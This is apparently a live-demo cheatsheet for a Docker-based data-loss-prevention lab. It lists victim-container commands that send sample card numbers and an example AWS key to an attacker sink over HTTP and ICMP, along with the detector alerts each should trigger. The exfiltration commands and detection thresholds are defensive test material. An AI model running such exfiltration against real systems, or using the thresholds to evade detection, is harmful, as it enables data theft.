# DLPDetection — Live Demo Cheatsheet

## Setup Prerequisites
1. Start the stack: `docker compose up -d`
2. Terminal 1 (Gateway logs): `docker compose logs -f gateway`
3. Terminal 2 (Covert detector): `docker compose logs -f covert-detector`
4. Terminal 3 (Attacker Sinks):
   - For HTTP: `docker compose exec attacker python servers/http_sink.py`
   - For DNS: `docker compose exec attacker python servers/dns_sink.py`
   - For ICMP: `docker compose exec attacker python servers/icmp_sink.py`

## 1. Web L7 DLP Scenarios (HTTP Port 80)

### 1.1 Benign Traffic (Pass-Through)

- **Command (Victim):**
```bash
  docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "user=alice&status=ok"
```

- **Expected:** `HTTP/1.1 200 OK` on Victim, data received on Attacker sink, 0 alerts on Gateway.

### 1.2 Credit Card Exfiltration (Luhn Block)

- **Command (Victim):**
```bash
docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "card=4111-1111-1111-1111"
```

- **Expected:** `HTTP 403 Forbidden` on Victim, alert `luhn_cc` in Gateway logs, nothing received on Attacker sink.

### 1.3 AWS Key Exfiltration (Regex Block)

- **Command (Victim):**
```bash
docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOSFODNN7EXAMPLE"
```


- **Expected:** `HTTP 403 Forbidden` on Victim, alert `AWS_ACCESS_KEY_ID` in Gateway logs.




## 2. Covert Channel Scenarios (L3/L4 ICMP)

### 2.1 Benign Diagnostic Ping (Baseline Pass-Through)
- **Command (Victim):**
  ```bash
  docker compose exec victim ping -c 2 172.21.0.10
  ```

- **Expected:** Normal packet debug logs in `covert-detector`, **0 DLP alerts** triggered.



### 2.2 Naive Bulk Exfiltration (Oversized Payload)

- **Command (Victim):**
  ```bash
  docker compose exec victim python attacks/icmp_exfiltrate.py --mode oversized
  ```


- **Expected Alert in `covert-detector`:**
  ```json
  [DLP-ALERT] {"channel": "covert_icmp", "rule_id": "icmp_oversized_payload", "severity": "high", "details": {"payload_size": 100, "threshold": 64}}
  ```





### 2.3 Sensitive Data Exfiltration (L7 Inspection inside ICMP)

- **Command (Victim):**
  ```bash
  docker compose exec victim python attacks/icmp_exfiltrate.py --mode sensitive --data "4532015112830366"
  ```


- **Expected Alert in `covert-detector`:**
  ```json
  [DLP-ALERT] {"channel": "covert_icmp", "rule_id": "icmp_sensitive_data_luhn_cc", "severity": "high", "details": {"matched": "4532015112830366", "detector": "luhn"}}
  ```





### 2.4 Rapid Exfiltration Burst (Behavioral Rate Limiting)

- **Command (Victim):**
  ```bash
  docker compose exec victim python attacks/icmp_exfiltrate.py --mode burst --count 6 --delay 0.05
  ```


- **Expected Alert in `covert-detector`:**
  ```json
  [DLP-ALERT] {"channel": "covert_icmp", "rule_id": "icmp_high_frequency", "severity": "high", "details": {"count": 5, "window_seconds": 1.0, "threshold": 4}}
  ```